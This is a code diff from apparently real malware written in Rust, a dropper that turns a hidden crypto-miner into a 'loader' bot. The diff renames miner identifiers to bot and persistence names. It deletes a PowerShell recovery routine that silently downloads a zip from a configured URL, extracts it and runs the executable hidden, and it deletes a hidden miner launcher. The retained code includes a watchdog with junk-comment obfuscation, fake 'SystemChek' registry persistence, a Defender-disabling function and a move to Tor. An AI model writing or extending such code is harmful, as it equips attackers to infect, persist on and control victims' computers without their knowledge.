@@ -1,7 +1,7 @@
 use std::fs::File;
 use std::io::Write;
 use std::path::{Path, PathBuf};
-use crate::common::constants::{get_miner_exe_name, get_monitor_script_name, get_launcher_script_name, CONFIG_FILENAME};
+use crate::common::constants::{get_bot_binary_name, get_persistence_script_name, get_launcher_script_name, CONFIG_FILENAME};
 
 #[cfg(windows)]
 use std::process::Command;
@@ -61,59 +61,9 @@ pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 
+// Recovery Script removed. HTTP Fallback deprecated in favor of Tor Bootstrap.
 fn get_recovery_script() -> String {
-    use crate::common::constants::get_download_url;
-    format!(
-        r#"
-$ErrorActionPreference = "SilentlyContinue"
-$REG_KEY = "HKCU:\Software\Microsoft\Windows\CurrentVersion\SystemChek"
-$REG_VAL_NODES = "Nodes"
-
-function Get-Nodes {{
-    if (-not (Test-Path $REG_KEY)) {{ return @() }}
-    $val = Get-ItemProperty -Path $REG_KEY -Name $REG_VAL_NODES -ErrorAction SilentlyContinue
-    if ($val) {{ return $val.$REG_VAL_NODES -split ";" | Where-Object {{ $_ -ne "" }} }}
-    return @()
-}}
-
-$nodes = Get-Nodes
-$alive = $false
-foreach ($node in $nodes) {{
-    if (Test-Path $node) {{
-        $alive = $true
-        break
-    }}
-}}
-
-if (-not $alive) {{
-    # ALL NODES DEAD. INITIATE RECOVERY.
-    $url = "{download_url}"
-    $temp = [System.IO.Path]::GetTempPath()
-    $zip = Join-Path $temp "sys_recovery_package.zip"
-    $dest = Join-Path $temp "sys_recovery_install"
-    
-    # Download
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($url, $zip)
-    
-    # Extract
-    $shell = New-Object -ComObject Shell.Application
-    $zipFile = $shell.NameSpace($zip)
-    New-Item -Path $dest -ItemType Directory -Force | Out-Null
-    $destDir = $shell.NameSpace($dest)
-    $destDir.CopyHere($zipFile.Items(), 16)
-    
-    # Run Installer
-    $exes = Get-ChildItem -Path $dest -Filter "*.exe" -Recurse
-    if ($exes) {{
-        $target = $exes[0].FullName
-        Start-Process -FilePath $target -WindowStyle Hidden
-    }}
-}}
-"#,
-        download_url = get_download_url()
-    )
+    String::new() 
 }
 
 pub fn create_watchdog_script(install_dirs: &[PathBuf], _config_path: &Path) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
@@ -122,11 +72,11 @@ pub fn create_watchdog_script(install_dirs: &[PathBuf], _config_path: &Path) -> 
         .collect();
     let _dirs_array = dirs_ps.join(", ");
 
-    let miner_name = get_miner_exe_name();
-    let monitor_name = get_monitor_script_name();
+    let bot_binary_name = get_bot_binary_name();
+    let monitor_name = get_persistence_script_name();
     let launcher_name_vbs = get_launcher_script_name();
     
-    // Embed the recovery script content into the watchdog so it can repair the Sleeper
+    // Embed the recovery script content (now empty, logic preserved for structure)
     let recovery_payload_raw = get_recovery_script();
     let recovery_payload_escaped = recovery_payload_raw.replace("\"", "`\"");
 
@@ -137,7 +87,7 @@ $ErrorActionPreference = "SilentlyContinue"
 
 # --- CONSTANTS ---
 $MY_DIR = $PSScriptRoot
-$MINER_EXE = Join-Path $MY_DIR "{miner_name}"
+$BOT_EXE = Join-Path $MY_DIR "{bot_binary_name}"
 $CONFIG = Join-Path $MY_DIR "{config_name}"
 $LAUNCHER_VBS = "{launcher_name_vbs}"
 $SCRIPT_NAME = $MyInvocation.MyCommand.Name
@@ -254,20 +204,7 @@ function Leader-Election ($nodes) {{
     return $false
 }}
 
-function Manage-Mining {{
-    if (Leader-Election (Get-Nodes)) {{
-        $proc = Get-Process -Name "{miner_proc}" -ErrorAction SilentlyContinue
-        if (-not $proc) {{
-            $psi = New-Object System.Diagnostics.ProcessStartInfo
-            $psi.FileName = $MINER_EXE
-            $psi.Arguments = "-c `"$CONFIG`""
-            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-            $psi.CreateNoWindow = $true
-            $psi.UseShellExecute = $false
-            [System.Diagnostics.Process]::Start($psi) | Out-Null
-        }}
-    }}
-}}
+# Manage-Mining Removed. Bot is Loader only.
 
 Self-Check
 {junk3}
@@ -275,14 +212,12 @@ while ($true) {{
     Self-Check
     $nodes = Perform-Mesh-Check
     Ensure-Sleeper
-    # Manage-Mining -> Handled by Bot Process Injection
     Start-Sleep -Seconds (10 + (Get-Random -Minimum 0 -Maximum 5))
 }}
 "#,
-        miner_name = miner_name,
+        bot_binary_name = bot_binary_name,
         config_name = CONFIG_FILENAME,
         launcher_name_vbs = launcher_name_vbs,
-        miner_proc = miner_name.trim_end_matches(".exe"),
         recovery_payload = recovery_payload_escaped,
         junk1 = generate_junk_comment(),
         junk2 = generate_junk_comment(),
